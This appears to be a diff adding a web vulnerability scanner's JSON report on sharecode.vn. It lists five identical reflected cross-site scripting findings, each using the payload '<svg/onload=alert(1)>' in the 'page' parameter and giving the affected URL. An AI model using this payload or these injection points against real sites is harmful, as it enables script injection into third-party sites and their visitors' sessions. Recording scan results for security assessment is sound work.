@@ -1,0 +1,87 @@
+{
+    "scan_target_initial": "https://sharecode.vn",
+    "scan_timestamp": "2025-05-16T13:44:10.425129Z",
+    "server_info_initial": {
+        "server_header": "cloudflare",
+        "technologies": []
+    },
+    "scanned_urls_with_params": [
+        "https://sharecode.vn/?page=1",
+        "https://sharecode.vn/?page=4",
+        "https://sharecode.vn/?page=3",
+        "https://sharecode.vn/?page=5",
+        "https://sharecode.vn/?page=2"
+    ],
+    "findings": [
+        {
+            "vulnerability_type": "XSS",
+            "vulnerable_url": "https://sharecode.vn/?page=%3Csvg%2Fonload%3Dalert%281%29%3E",
+            "parameter": "page",
+            "payload_source_file": "XSS_Generic_Reflected.txt",
+            "payload_used": "<svg/onload=alert(1)>",
+            "detection_method": "Reflected",
+            "evidence": "Payload XSS '<svg/onload=alert(1)>' (phần 'onload=alert(1)') phản chiếu.",
+            "http_status_code": 500,
+            "error_name": "Reflected Cross-Site Scripting (XSS)",
+            "cwe": "CWE-79",
+            "owasp_category": "A03:2021-Injection",
+            "loi": true
+        },
+        {
+            "vulnerability_type": "XSS",
+            "vulnerable_url": "https://sharecode.vn/?page=%3Csvg%2Fonload%3Dalert%281%29%3E",
+            "parameter": "page",
+            "payload_source_file": "XSS_Generic_Reflected.txt",
+            "payload_used": "<svg/onload=alert(1)>",
+            "detection_method": "Reflected",
+            "evidence": "Payload XSS '<svg/onload=alert(1)>' (phần 'onload=alert(1)') phản chiếu.",
+            "http_status_code": 500,
+            "error_name": "Reflected Cross-Site Scripting (XSS)",
+            "cwe": "CWE-79",
+            "owasp_category": "A03:2021-Injection",
+            "loi": true
+        },
+        {
+            "vulnerability_type": "XSS",
+            "vulnerable_url": "https://sharecode.vn/?page=%3Csvg%2Fonload%3Dalert%281%29%3E",
+            "parameter": "page",
+            "payload_source_file": "XSS_Generic_Reflected.txt",
+            "payload_used": "<svg/onload=alert(1)>",
+            "detection_method": "Reflected",
+            "evidence": "Payload XSS '<svg/onload=alert(1)>' (phần 'onload=alert(1)') phản chiếu.",
+            "http_status_code": 500,
+            "error_name": "Reflected Cross-Site Scripting (XSS)",
+            "cwe": "CWE-79",
+            "owasp_category": "A03:2021-Injection",
+            "loi": true
+        },
+        {
+            "vulnerability_type": "XSS",
+            "vulnerable_url": "https://sharecode.vn/?page=%3Csvg%2Fonload%3Dalert%281%29%3E",
+            "parameter": "page",
+            "payload_source_file": "XSS_Generic_Reflected.txt",
+            "payload_used": "<svg/onload=alert(1)>",
+            "detection_method": "Reflected",
+            "evidence": "Payload XSS '<svg/onload=alert(1)>' (phần 'onload=alert(1)') phản chiếu.",
+            "http_status_code": 500,
+            "error_name": "Reflected Cross-Site Scripting (XSS)",
+            "cwe": "CWE-79",
+            "owasp_category": "A03:2021-Injection",
+            "loi": true
+        },
+        {
+            "vulnerability_type": "XSS",
+            "vulnerable_url": "https://sharecode.vn/?page=%3Csvg%2Fonload%3Dalert%281%29%3E",
+            "parameter": "page",
+            "payload_source_file": "XSS_Generic_Reflected.txt",
+            "payload_used": "<svg/onload=alert(1)>",
+            "detection_method": "Reflected",
+            "evidence": "Payload XSS '<svg/onload=alert(1)>' (phần 'onload=alert(1)') phản chiếu.",
+            "http_status_code": 500,
+            "error_name": "Reflected Cross-Site Scripting (XSS)",
+            "cwe": "CWE-79",
+            "owasp_category": "A03:2021-Injection",
+            "loi": true
+        }
+    ]
+}
